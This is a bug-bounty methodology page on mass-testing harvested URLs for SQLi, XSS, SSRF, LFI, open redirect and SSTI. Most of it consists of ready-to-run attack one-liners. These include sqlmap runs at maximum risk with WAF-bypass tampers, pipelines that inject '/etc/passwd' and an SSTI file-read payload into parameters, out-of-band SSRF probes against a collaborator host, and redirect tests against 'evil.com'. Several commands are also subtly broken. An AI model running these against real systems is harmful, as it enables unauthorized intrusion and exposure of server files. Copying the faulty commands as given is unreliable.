---
title: 8-GF Automation
draft: false
tags:
---

Now that we have sorted out endpoints based on `gf` patterns for SQLi, XSS, SSRF, LFI, and Open Redirect, let's exploit them.

-----------
## SQLi

Feed it to `sqlmap`:

```
sqlmap -m sql --batch --random-agent --level 5 --risk 3 --tamper=between -v3 > sqlmap_output.txt
```

> Try to figure out the SQL version and add it using `--dbms` flag.

WAF Bypass:

```
sqlmap -m --dbs --level=5 --risk=3 --user-agent -v3 --tamper="between,randomcase,space2comment" --batch -v3 > sqlmap_output.txt
```

----------------------------------------
## XSS

For XSS, there are couple of ways to test it.

dalfox, xsstrike, and knoxss are the best ways to do it. 
### dalfox

`dalfox` will help on automatically scanning for XSS.

We can install it as such:

```
┌──(carabiner1㉿carabiner)-[~/Documents/bbh/who/who_urls]
└─$ export GOPROXY=https://goproxy.io
                                                                                                                        
┌──(carabiner1㉿carabiner)-[~/Documents/bbh/who/who_urls]
└─$ /usr/local/go/bin/go install github.com/hahwul/dalfox/v2@latest

go: downloading github.com/hahwul/dalfox v1.2.1
go: downloading github.com/hahwul/dalfox/v2 v2.9.3
```

Running `dalfox` after running `paramspider` might be a good idea. 

Let's feed potentially XSS vulnerable URLs to `dalfox`:

```
cat gf_xss_uniq.txt | ~/go/bin/gf xss | sed 's/#,*/#/' | ~/go/bin/dalfox pipe -o output.txt    
```

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/bbh/methodology/Screenshot from 2024-10-31 21-51-04.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/bbh/methodology/Pasted image 20241031215603.png)


If we want to get dalfox run faster, we can use `multicast`. Decide wisely on whether to use this flag or not based on your internet connection.

```
cat urls.txt | dalfox pipe --multicast -o xss.txt
```

### XSSstrike

```
python3 xsstrike.py --seeds ~/Documents/bbh/dutch/gf_xss_uniq.txt --blind --file-log-level DEBUG --log-file ~/Documents/xss_log_2215.txt
```

```
python3 xsstrike.py --seeds ~/Documents/bbh/dutch/gf_xss_uniq.txt 
```

For scanning single url:

```
xsstrike -f url
```

For scanning list of urls:

```
xsstrike --seeds xss -t 10 --blind (add your blind xss on /opt/xsstrike/core/config.py)
```

For generating blind xss payloads, use [this](https://github.com/jadu101/blind_xss_payload_generator)

```
while IFS= read -r url; do
    echo "Testing URL: $url"
    python3 xsstrike.py -u "$url"
done < ~/Documents/bbh/dutch/gf_xss_uniq.txt
```

### KNOXSS

Needs subscription. It is around $20 for 6 months.

I will definitely check it out later. 

---------------------
## SSRF

We can use couple of methods to validate SSRF.

- FFuf with Burp Collaborator
- SSRFMap
- SSRF-Finder with surf
- SSRF-King on Burp Suite

### FFuf with Collaborator

Append burp collaborator payload to the URLs:

```
cat gf_ssrf_uniq.txt | /home/carabiner1/go/bin/qsreplace tb825nl8s8wamuib81jppheomfs6gw4l.oastify.com >> ssrf_collaborator_payload.txt
```

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/bbh/methodology/Pasted image 20241101190749.png)

URLs are gonna look something like below:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/bbh/methodology/Pasted image 20241101190804.png)

Now run through URLs with burp collaborator through `ffuf`:

```
ffuf -c -w ssrf_collaborator_payload.txt -u FUZZ
```

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/bbh/methodology/Pasted image 20241101191008.png)

### xargs with Collaborator

```
cat wayback.txt | gf ssrf | sort -u |anew | httpx | qsreplace 'burpcollaborator_link' | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "compute.internal" && echo "SSRF VULN! %"'
```

### SSRF-Finder with Surf

`surf` allows you to filter a list of hosts, returning a list of viable SSRF candidates:

```
surf -l ssrf -t 10 -c 200
```

Feed it to `SSRF-Finder`:

```
cat ssrf | ssrf-finder
```

-------------------------------
## LFI
### LFIMap

Feed it to `lfimap`:

```
sudo python3 lfimap/lfimap.py --no-stop -F ~/Documents/bbh/nokia/urls/mass_lfi/gf_lfi_uniq.txt -a |& sudo tee -a ~/Documents/bbh/nokia/urls/mass_lfi/lfi_results3.txt 
```

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/bbh/methodology/Pasted image 20241101152104.png)
![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/bbh/methodology/Pasted image 20241101155257.png)

### httpx

Testing for LFI with custom paths and regex:

```
httpx -l lfi -paths /root/LFI-files -threads 100 -random-agent -mc 200 -mr "root:[x*]:0:0:"
```

**Purpose**: Uses `httpx` to test multiple URLs in parallel for LFI vulnerabilities. The `-paths` option specifies a file with potential LFI paths, and `-mr` filters responses that contain a regex pattern indicating sensitive file access (like `/etc/passwd` contents

Using `httpx` with wordlist for LFI:

```
cat hosts | gau | gf lfi | httpx -paths lfi_wordlist.txt -threads 100 -random-agent -x GET,POST -tech-detect -status-code -follow-redirects -mc 200 -mr "root:[x*]:0:0:"
```

**Purpose**: Combines `gau` (Get All URLs) with `gf` (grep filtering for patterns) to gather potential LFI paths. These paths are then tested using `httpx` with GET and POST methods and specified HTTP response patterns.


### nuclei

**Basic LFI Detection with Nuclei Tags:**

```
nuclei -l urls-his -c 200 -tags lfi
```

**Purpose**: Runs `nuclei` on URLs in the `urls-his` file, specifically targeting LFI vulnerabilities using templates tagged as LFI.

**Advanced Vulnerability Scanning with Tags:**

```
nuclei -c 500 -l urls.txt -t nuclei-templates/ -severity critical,high -ept ssl,tcp -tags cve,rce,log4j,grafana,tomcat,solar,apache,lfi,ssrf,sql,xxe,symfony,exposure,traversal,panel,default-login,confluence,vmware,vcenter -o url_results.txt
```

**Purpose**: Performs a broader scan using `nuclei` templates with various vulnerability tags and high-severity filters. This command detects a variety of vulnerabilities, including LFI, RCE, and XXE, with output saved to `url_results.txt`

**Fuzzing with Nuclei Templates:**

```
nuclei -l urls-his -c 200 -t fuzzing-templates -s critical,high
```

**Purpose**: Uses specific fuzzing templates in `nuclei` to test for high-severity vulnerabilities across multiple URLs. This is useful for identifying unexpected or complex attack vectors.


### Using `curl` and `waybackurls`

Testing LFI via Wayback Machine URLs:

```
waybackurls target.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
```

Direct LFI Testing with cURL:

```
waybackurls target.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
```

--------
## Open Redirect
### Collaborator

Append burp collaborator payload to the URLs:

```
cat gf_redirect_uniq.txt | /home/carabiner1/go/bin/qsreplace tb825nl8s8wamuib81jppheomfs6gw4l.oastify.com >> redirect_collaborator_payload.txt
```

Now run through URLs with burp collaborator through `ffuf`:

```
ffuf -c -w redirect_collaborator_payload.txt -u FUZZ
```

### cURL

```
waybackurls target.com | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I| grep "http://evil.com" && echo -e "$host \033[0;31mVulnerable\n" ;done
```

### httpx

```
cat subs.txt| waybackurls | gf redirect | qsreplace 'http://example.com' | httpx -fr -title -match-string 'Example Domain'
```

### xargs

```
gau [http://vuln.target.com](http://vuln.target.com/) | gf redirect | qsreplace “$LHOST” | xargs -I % -P 25 sh -c ‘curl -Is “%” 2>&1 | grep -q “Location: $LHOST” && echo “VULN! %”’
```

----
## SSTI

```
cat gf_ssti_uniq.txt  | ~/go/bin/qsreplace "{{''.class.mro[2].subclasses()[40]('/etc/passwd').read()}}" | parallel -j50 -q curl -g | grep  "root:x"
```

```
for url in $(cat targets.txt); do python3 tplmap.py -u $url; print $url; done
```

